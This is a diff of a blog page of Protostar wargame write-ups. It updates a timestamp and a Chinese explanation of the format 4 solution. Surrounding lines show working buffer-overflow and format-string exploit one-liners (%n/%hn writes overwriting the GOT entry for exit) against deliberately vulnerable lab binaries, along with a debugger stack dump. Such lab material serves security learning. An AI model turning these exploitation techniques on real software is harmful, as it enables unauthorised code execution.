@@ -69,7 +69,7 @@ stack 2#include &amp;lt;stdio.h&amp;gt;int main(int argc, const char *argv[])&am
 <meta property="og:description" content="stack 0python -c &amp;quot;print &amp;#39;A&amp;#39;*65&amp;quot; | ./stack0
 stack 1./stack1 $(python -c &amp;quot;print &amp;#39;dcba&amp;#39;*17&amp;quot;)
 stack 2#include &amp;lt;stdio.h&amp;gt;int main(int argc, const char *argv[])&amp;#123">
-<meta property="og:updated_time" content="2016-07-22T05:46:40.000Z">
+<meta property="og:updated_time" content="2016-07-22T05:48:36.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Protostar writeups">
 <meta name="twitter:description" content="stack 0python -c &amp;quot;print &amp;#39;A&amp;#39;*65&amp;quot; | ./stack0
@@ -360,7 +360,7 @@ stack 2#include &amp;lt;stdio.h&amp;gt;int main(int argc, const char *argv[])&am
 <figure class="highlight"><table><tr><td class="code"><pre><span class="line">[-------------------------------------code-------------------------------------]&#10;   0x8048485 &#60;vuln+49&#62;:&#9;call   0x804837c &#60;printf@plt&#62;&#10;=&#62; 0x804848a &#60;vuln+54&#62;:&#9;mov    eax,ds:0x80496e4&#10;[------------------------------------stack-------------------------------------]&#10;0000| 0xffffd670 --&#62; 0xffffd680 (&#34;%08x%2$hn\n&#34;)&#10;0004| 0xffffd674 --&#62; 0x200&#10;0008| 0xffffd678 --&#62; 0xf7fcbc20 --&#62; 0xfbad0008&#10;0012| 0xffffd67c --&#62; 0xf7fec328 (mov    edi,eax)&#10;0016| 0xffffd680 (&#34;%08x%2$hn\n&#34;)&#10;0020| 0xffffd684 (&#34;%2$hn\n&#34;)&#10;0024| 0xffffd688 --&#62; 0xa6e (&#39;n\n&#39;)&#10;0028| 0xffffd68c --&#62; 0x0&#10;[------------------------------------------------------------------------------]</span><br></pre></td></tr></table></figure>
 <h2 id="format_3">format 3</h2><p>通过<code>%hn</code>进行二次写入</p>
 <p><code>python -c &quot;print &#39;\xf6\x96\x04\x08\xf4\x96\x04\x08&#39; + &#39;%0250x&#39; + &#39;%12\$n&#39; + &#39;%021570x&#39; + &#39;%13\$hn&#39;&quot; | ./format3</code></p>
-<h2 id="format_4">format 4</h2><p>修改<code>got表</code>里<code>exit</code>函数的地址为<code>0x80484b4</code></p>
+<h2 id="format_4">format 4</h2><p>通过二次写入修改<code>got表</code>里<code>exit</code>函数的地址为<code>0x80484b4</code></p>
 <p><code>python -c &quot;print &#39;\x26\x97\x04\x08\x24\x97\x04\x08&#39; + &#39;%02044x&#39; + &#39;%4\$hn&#39; + &#39;%031920x&#39;+ &#39;%5\$hn&#39;&quot; | ./format4</code></p>
 </span>
       
